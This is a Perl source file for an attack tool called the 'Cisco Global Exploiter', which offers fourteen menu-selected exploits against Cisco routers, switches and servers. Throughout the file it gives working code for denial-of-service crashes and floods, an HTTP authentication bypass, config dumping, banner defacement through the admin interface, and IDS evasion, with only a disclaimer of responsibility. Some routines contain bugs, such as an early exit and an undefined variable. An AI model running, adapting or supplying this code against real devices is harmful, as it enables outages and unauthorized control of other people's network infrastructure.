#!/usr/bin/perl

##
#   Cisco Global Exploiter
#
#   Legal notes :
#   The BlackAngels staff refuse all responsabilities 
#   for an incorrect or illegal use of this software 
#   or for eventual damages to others systems.
#
#   http://www.blackangels.it
##
$|=1;


##
#   Modules
##

use Socket;
use IO::Socket;
use Time::Out qw(timeout) ;

##
#   Main
##

$host = "";
$expvuln = "";
$host = @ARGV[ 0 ];
$expvuln = @ARGV[ 1 ];

if ($host eq "") {
    usage();
}
if ($expvuln eq "") {
    usage();
}
if ($expvuln eq "1") {
    cisco1();
} 
elsif ($expvuln eq "2") {
    cisco2();
} 
elsif ($expvuln eq "3") {
    cisco3();
} 
elsif ($expvuln eq "4") {
    cisco4();
} 
elsif ($expvuln eq "5") {
    cisco5();
} 
elsif ($expvuln eq "6") {
    cisco6();
} 
elsif ($expvuln eq "7") {
    cisco7();
} 
elsif ($expvuln eq "8") {
    cisco8();
} 
elsif ($expvuln eq "9") {
    cisco9();
}
elsif ($expvuln eq "10") {
    cisco10();
}
elsif ($expvuln eq "11") {
    cisco11();
}
elsif ($expvuln eq "12") {
    cisco12();
}
elsif ($expvuln eq "13") {
    cisco13();
}
elsif ($expvuln eq "14") {
    cisco14();
}
else {
    printf "\nInvalid vulnerability number ...\n\n";
}


##
#   Functions
##

sub usage
{
    printf "\nUsage :\n";
    printf "perl cge.pl <target> <vulnerability number>\n\n";
    printf "Vulnerabilities list :\n";
    printf "[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability\n";
    printf "[2] - Cisco IOS Router Denial of Service Vulnerability\n";
    printf "[3] - Cisco IOS HTTP Auth Vulnerability\n";
    printf "[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability\n";
    printf "[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability\n";
    printf "[6] - Cisco 675 Web Administration Denial of Service Vulnerability\n";
    printf "[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability\n";
    printf "[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability\n";
    printf "[9] - Cisco 514 UDP Flood Denial of Service Vulnerability\n";
    printf "[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability\n";
    printf "[11] - Cisco Catalyst Memory Leak Vulnerability\n";
    printf "[12] - Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability\n";
    printf "[13] - %u Encoding IDS Bypass Vulnerability (UTF)\n";
    printf "[14] - Cisco IOS HTTP Denial of Service Vulnerability\n";
}

sub cisco1              # Cisco 677/678 Telnet Buffer Overflow Vulnerability
{
    my $serv = $host;
    my $dch = "?????????????????a~                %%%%%XX%%%%%";
    my $num = 30000;
    my $string .= $dch x $num;
    my $shc="\015\012";

    my $sockd = IO::Socket::INET->new (
        Proto    => "tcp",
        PeerAddr => $serv,
        PeerPort => "(23)",
        );

    unless($sockd) {
        print ("No telnet server detected on $serv ...\n\n");
        exit(1);
    };

    $sockd->autoflush(1);
    print $sockd "$string". $shc;
    if ($@){
        print "Server closed connection\n\n";
    }
    else{
        print("\nWaiting up to 60 seconds\n");
        timeout 60 => sub {
            while (<$sockd>){ print }
        };
        if ($@){
            print "Vulnerability unsuccessful exploited. Target server is still up ...\n\n";
            exit(1);
        }
    }
    print("\nPacket sent ...\n");
    sleep(1);
    print("Now checking server's status ...\n");
    sleep(2);

    my $sockd2 = IO::Socket::INET->new (
        Proto    => "tcp",
        PeerAddr => $serv,
        PeerPort => "(23)",
        );
    unless ($sockd2) {
        print ("Vulnerability successful exploited. Target server is down ...\n\n");
        exit(0);
    };

    print("Vulnerability unsuccessful exploited. Target server is still up ...\n\n");
    close($sockd2);
    exit(1);
}

sub cisco2              # Cisco IOS Router Denial of Service Vulnerability
{
    my $serv = $host;

    my $sockd = IO::Socket::INET->new (
        Proto=>"tcp",
        PeerAddr=>$serv,
        PeerPort=>"http(80)",);

    unless ($sockd){
        print "No http server detected on $serv ...\n\n";
        exit(1);
    };

    $sockd->autoflush(1);
    print $sockd "GET /\%\% HTTP/1.0\n\n";
    close $sockd;
    print "Packet sent ...\n";
    sleep(1);
    print("Now checking server's status ...\n");
    sleep(2);

    my $sockd2 = IO::Socket::INET->new (
        Proto=>"tcp",
        PeerAddr=>$serv,
        PeerPort=>"http(80)",);

    unless ($sockd2){
        print "Vulnerability successful exploited. Target server is down ...\n\n";
        exit(0);
    };

    print("Vulnerability unsuccessful exploited. Target server is still up ...\n\n");
    close($sockd2);
    exit(1)
}

sub cisco3              # Cisco IOS HTTP Auth Vulnerability
{
    my $serv= $host;
    my $n=16;
    my $port=80;
    my $target = inet_aton($serv);
    my $fg = 0;

    LAB: while ($n<100) {
        my @results=exploit("GET /level/".$n."/exec/- HTTP/1.0\r\n\r\n");
        $n++;
        foreach $line (@results){
            $line=~ tr/A-Z/a-z/;
            if ($line =~ /http\/1\.0 401 unauthorized/) {$fg=1;}
            if ($line =~ /http\/1\.0 200 ok/) {$fg=0;}
        }

        if ($fg==1) {
            sleep(2);
            print "Vulnerability unsuccessful exploited ...\n\n";
            exit(1);
        }
        else {
            sleep(2);
            print "\nVulnerability successful exploited with [http://$serv/level/$n/exec/....] ...\n\n";
            exit(0);
            last LAB;
        }

        sub exploit {
            my ($pstr)=@_;
            socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
            exit(1);
            if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);
                $|=1;
                print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
            }
            else {
                print("No http server detected on $serv ...\n\n");
                exit(1);
            }
        }
    }
}

sub cisco4              # Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability
{
    my $serv = $host;
    my $n = 16;

    while ($n <100) {
        exploit1("GET /level/$n/exec/- HTTP/1.0\n\n");
        $wr =~ s/\n//g;
        if ($wr =~ /200 ok/) {
        while(1)
        {
            print "\nVulnerability could be successful exploited. Please choose a type of attack :\n";
            print "[1] Banner change\n";
            print "[2] List vty 0 4 acl info\n";
            print "[3] Other\n";
            print "Enter a valid option [ 1 - 2 - 3 ] : ";
            exit(0);

            $vuln = <STDIN>;
            chomp($vuln);

            if ($vuln == 1) {
                print "\nEnter deface line : ";
                $vuln = <STDIN>;
                chomp($vuln);
                exploit1("GET /level/$n/exec/-/configure/-/banner/motd/$vuln HTTP/1.0\n\n");
            }
            elsif ($vuln == 2) {
                exploit1("GET /level/$n/exec/show%20conf HTTP/1.0\n\n");
                print "$wrf";
            }
            elsif ($vuln == 3)
            {
                print "\nEnter attack URL : ";
                $vuln = <STDIN>;
                chomp($vuln);
                exploit1("GET /$vuln HTTP/1.0\n\n");
                print "$wrf";
            }
        }
        }
        $wr = "";
        $n++;
    }
    print "Vulnerability unsuccessful exploited ...\n\n";
    exit(1);

    sub exploit1 {
        my $sockd = IO::Socket::INET -> new (
            Proto    => 'tcp',
            PeerAddr => $serv,
            PeerPort  => 80,
            Type      => SOCK_STREAM,
            Timeout   => 5);
        unless($sockd){
            print "No http server detected on $serv ...\n\n";
            exit(1);
        }

        $sockd->autoflush(1);
        $sockd -> send($_[0]);
        while(<$sockd>){$wr .= $_} $wrf = $wr;
        close $sockd;
    }
}

sub cisco5              # Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability
{
    my $serv = $host;
    my $port = 22;
    my $vuln = "a%a%a%a%a%a%a%";

    my $sockd = IO::Socket::INET->new (
        PeerAddr => $serv,
        PeerPort => $port,
        Proto    => "tcp");
    unless($sockd){
        print "No ssh server detected on $serv ...\n\n";
        exit(1);
    }

    print "Packet sent ...\n";
    print $sockd "$vuln";
    close($sockd);

    my $sockd2 = IO::Socket::INET->new (
        Proto=>"tcp",
        PeerAddr=>$serv,
        PeerPort => $port);

    unless ($sockd2){
        print "Vulnerability successful exploited. Target server is down ...\n\n";
        exit(0);
    };

    print("Vulnerability unsuccessful exploited. Target server is still up ...\n\n");
    exit(1);
}

sub cisco6              # Cisco 675 Web Administration Denial of Service Vulnerability
{
    my $serv = $host;
    my $port = 80;
    my $vuln = "GET ? HTTP/1.0\n\n";

    my $sockd = IO::Socket::INET->new (
        PeerAddr => $serv,
        PeerPort => $port,
        Proto    => "tcp");
    unless($sockd) {
        print "No http server detected on $serv ...\n\n";
        exit(1);
    }

    print "Packet sent ...\n";
    print $sockd "$vuln";
    sleep(2);
    print "\nServer response :\n\n";
    close($sockd);

    my $sockd2 = IO::Socket::INET->new (
        Proto=>"tcp",
        PeerAddr=>$serv,
        PeerPort => $port);
    unless ($sockd2){
        print "Vulnerability successful exploited. Target server is down ...\n\n";
        exit(0);
    };

    print("Vulnerability unsuccessful exploited. Target server is still up ...\n\n");
    exit(1);
}

sub cisco7              # Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability
{
    my $serv = $host;
    my $port = 80;
    my $k = "";

    print "Enter a file to read [ /show/config/cr set as default ] : ";
    $k = <STDIN>;
    chomp ($k);
    if ($k eq "") {$vuln = "GET /exec/show/config/cr HTTP/1.0\n\n";}
    else {$vuln = "GET /exec$k HTTP/1.0\n\n";}

    my $sockd = IO::Socket::INET->new (
        PeerAddr => $serv,
        PeerPort => $port,
        Proto    => "tcp");
    unless($sockd){
        print "No http server detected on $serv ...\n\n";
        exit(1);
    }

    print "Packet sent ...\n";
    print $sockd "$vuln";
    sleep(2);
    print "\nServer response :\n\n";
    print("\nWaiting up to 60 seconds\n");
    timeout 60 => sub { while (<$sockd>){ print } };
    if ($@){
        print "Time out\n\n";
        exit(1);
    }
    close($sockd);
    exit(0);
}

sub cisco8              # Cisco IOS Software HTTP Request Denial of Service Vulnerability
{
    my $serv = $host;
    my $port = 80;
    my $vuln = "GET /error?/ HTTP/1.0\n\n";

    my $sockd = IO::Socket::INET->new (
        PeerAddr => $serv,
        PeerPort => $port,
        Proto    => "tcp");
    unless($sockd){
        print "No http server detected on $serv ...\n\n";
        exit(1);
    }

    print "Packet sent ...\n";
    print $sockd "$vuln";
    sleep(2);
    print "\nServer response :\n\n";
    print("\nWaiting up to 60 seconds\n");
    timeout 60 => sub { while (<$sockd>){ print } };
    close($sockd);

    my $sockd2 = IO::Socket::INET->new (
        Proto=>"tcp",
        PeerAddr=>$serv,
        PeerPort => $port);

    unless ($sockd2){
        print "Vulnerability successful exploited. Target server is down ...\n\n";
        exit(0);
    };

    print("Vulnerability unsuccessful exploited. Target server is still up ...\n\n");
    exit(1);
}

sub cisco9              # Cisco 514 UDP Flood Denial of Service Vulnerability
{
    my $ip = $host;
    my $port = "514";
    my $ports = "";
    my $size = "";
    my $i = "";
    my $string = "%%%%%XX%%%%%";

    print "Input packets size : ";
    $size = <STDIN>;
    chomp($size);

    socket(SS, PF_INET, SOCK_DGRAM, 17);
    my $iaddr = inet_aton("$ip");

    for ($i=0; $i<10000; $i++)
    { send(SS, $string, $size, sockaddr_in($port, $iaddr)); }

    printf "\nPackets sent ...\n";
    sleep(2);
    printf "Please enter a server's open port : ";
    $ports = <STDIN>;
    chomp $ports;
    printf "\nNow checking server status ...\n";
    sleep(2);

    unless(socket(SO, PF_INET, SOCK_STREAM, getprotobyname('tcp'))){
        print "An error occuring while loading socket ...\n\n";
        exit(1);
    }
    my $dest = sockaddr_in ($ports, inet_aton($ip));

    unless(connect (SO, $dest)){
        print "Vulnerability successful exploited. Target server is down ...\n\n";
        exit(0)
    }

    printf "Vulnerability unsuccessful exploited. Target server is still up ...\n\n";
    exit(1)
}

sub cisco10             # CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability
{
    my $ip = $host;
    my $vln = "%%%%%XX%%%%%";
    my $num = 30000;
    my $string .= $vln x $num;
    my $shc="\015\012";

    my $sockd = IO::Socket::INET->new (
        Proto       => "tcp",
        PeerAddr    => $ip,
        PeerPort    => "(2002)",
        );

    unless($socket){
        print"Unable to connect to $ip:2002 ...\n\n";
        exit(1);
    }

    $sockd->autoflush(1);
    print $sockd "$string" . $shc;
    print("\nWaiting up to 60 seconds\n");
    timeout 60 => sub { while (<$sockd>){ print } };
    if ($@){
        print "Vulnerability unsuccessful exploited. Target server is still up ...\n\n";
        exit(1);
    }
    print "Packet sent ...\n";
    close($sockd);
    sleep(1);
    print("Now checking server's status ...\n");
    sleep(2);

    my $sockd2 = IO::Socket::INET->new (
        Proto=>"tcp",
        PeerAddr=>$ip,
        PeerPort=>"(2002)",);
    unless ($sockd2){
        print "Vulnerability successful exploited. Target server is down ...\n\n";
        exit(0)
    };

    print("Vulnerability unsuccessful exploited. Target server is still up ...\n\n");
    exit(1)
}

sub cisco11             # Cisco Catalyst Memory Leak Vulnerability
{
    my $serv = $host;
    my $rep = "";
    my $str = "AAA\n";

    print "\nInput the number of repetitions : ";
    $rep = <STDIN>;
    chomp $rep;

    my $sockd = IO::Socket::INET->new (
        PeerAddr => $serv,
        PeerPort => "(23)",
        Proto    => "tcp");
    unless($sockd){
        print("No telnet server detected on $serv ...\n\n");
        exit(1);
    }

    for ($k=0; $k<=$rep; $k++) {
        print $sockd "$str";
        sleep(1);
        print $sockd "$str";
        sleep(1);
    }
    close($sockd);
    print "Packet sent ...\n";
    sleep(1);
    print("Now checking server's status ...\n");
    sleep(2);

    my $sockd2 = IO::Socket::INET->new (
        Proto=>"tcp",
        PeerAddr=>$serv,
        PeerPort=>"(23)",);
    unless ($sockd2){
        print "Vulnerability successful exploited. Target server is down ...\n\n";
        exit(0);
    };

    print "Vulnerability unsuccessful exploited. Target server is still up after $rep logins ...\\n";
    close($sockd2);
    exit(1);
}

sub cisco12             # Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability
{
    my $serv = $host;
    my $l =100;
    my $vuln = "";
    my $long = "A" x $l;

    my $sockd = IO::Socket::INET->new (
        PeerAddr => $serv,
        PeerPort => "(80)",
        Proto    => "tcp");
    unless($sockd){
        print "No http server detected on $serv ...\n\n";
        exit(1);
    }

    for ($k=0; $k<=50; $k++) {
        $long = "A" x $l;
        my $vuln = "GET " . $long . " HTTP/1.0\n\n";
        if($sockd->connected){
            print $sockd "$vuln\n\n";
        }
        else{
            print("Server closed connection");
            last;
        }
        sleep(1);
        $l = $l + 100;
    }

    close($sockd);
    print "Packet sent ...\n";
    sleep(1);
    print("Now checking server's status ...\n");
    sleep(2);

    my $sockd2 = IO::Socket::INET->new (
        Proto=>"tcp",
        PeerAddr=>$serv,
        PeerPort=>"http(80)",);
    unless ($sockd2){
        print "Vulnerability successful exploited. Target server is down ...\n\n";
        exit(0);
    };

    print "Target is not vulnerable. Server is still up after 5 kb of buffer ...)\n";
    close($sockd2);
    exit(1);
}

sub cisco13             # %u Encoding IDS Bypass Vulnerability (UTF)
{
    my $serv = $host;
    my $vuln = "GET %u002F HTTP/1.0\n\n";

    my $sockd = IO::Socket::INET->new (
        PeerAddr => $serv,
        PeerPort => "(80)",
        Proto    => "tcp");
    unless($sockd){
        print "No http server detected on $serv ...\n\n";
        exit(1);
    }

    print "Packet sent ...\n";
    print $sockd "$vuln";
    close($sockd);
    sleep(1);
    print("Now checking server's status ...\n");
    print("Please verify if directory has been listed ...\n\n");
    print("Server response :\n");
    sleep(2);
    print("\nWaiting up to 60 seconds\n");
    timeout 60 => sub { while (<$sockd>){ print } };
    exit(0)
}

sub cisco14             # Cisco IOS HTTP server DoS Vulnerability
{
    my $serv = $host;
    my $vuln = "GET  /TEST?/ HTTP/1.0";

    my $sockd = IO::Socket::INET->new (
        Proto=>"tcp",
        PeerAddr=>$serv,
        PeerPort=>"http(80)",);
    unless ($sockd){
        print "No http server detected on $serv ...\n\n";
        exit(1);
    };

    print $sockd "$vuln\n\n";
    print "Packet sent ...\n";
    close($sockd);
    sleep(1);
    print("Now checking server's status ...\n");
    sleep(2);

    my $sockd2 = IO::Socket::INET->new (
        Proto=>"tcp",
        PeerAddr=>$serv,
        PeerPort=>"http(80)",);
    unless ($sockd2){
        print "Vulnerability successful exploited. Target server is down ...\n\n";
        exit(0);
    };

    print("Vulnerability unsuccessful exploited. Target server is still up ...\n\n");
    close($sockd2);
    exit(1);
}